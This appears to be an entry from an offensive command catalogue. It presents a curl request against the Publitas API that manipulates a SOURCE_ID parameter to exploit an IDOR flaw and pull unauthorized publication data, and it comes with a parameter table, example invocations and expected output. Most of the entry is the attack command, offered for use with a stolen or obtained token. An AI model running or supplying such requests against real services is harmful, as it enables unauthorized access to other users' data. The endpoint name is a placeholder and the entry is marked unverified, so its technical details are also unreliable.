---
id: c1d2e3f4-g5h6-7891-ijkl-678901234567
data: >-
  curl -X GET
  "https://api.publitas.com/vulnerable-endpoint?SOURCE_ID=TARGET_SOURCE_ID" -H
  "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json"
tags:
  - http
  - api
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.327Z'
verified: false
validated: true
submitted: true
---
# curl-publitas-idor-request

## Command

```bash
curl -X GET "https://api.publitas.com/vulnerable-endpoint?SOURCE_ID=TARGET_SOURCE_ID" -H "Authorization: Bearer YOUR_TOKEN" -H "Content-Type: application/json"
```

## Description

This command sends an HTTP GET request to the Publitas vulnerable endpoint, manipulating the SOURCE_ID parameter to exploit IDOR and retrieve unauthorized publication data. Use it after obtaining a valid auth token and target ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `SOURCE_ID=TARGET_SOURCE_ID` | The manipulated ID for the target publication | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Auth header with session token | Yes |
| `-H "Content-Type: application/json"` | Sets request content type | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.publitas.com/vulnerable-endpoint?SOURCE_ID=12345" -H "Authorization: Bearer abc123"
```

### Advanced Usage

```bash
curl -X GET "https://api.publitas.com/vulnerable-endpoint?SOURCE_ID=12345" -H "Authorization: Bearer abc123" -H "Content-Type: application/json" -v
```

## Expected Output

JSON response with publication details, e.g., {"cover_url": "https://cdn.publitas.com/cover/12345/user456"}. Errors if IDOR fails.

## Related

- [[Related Procedure]]
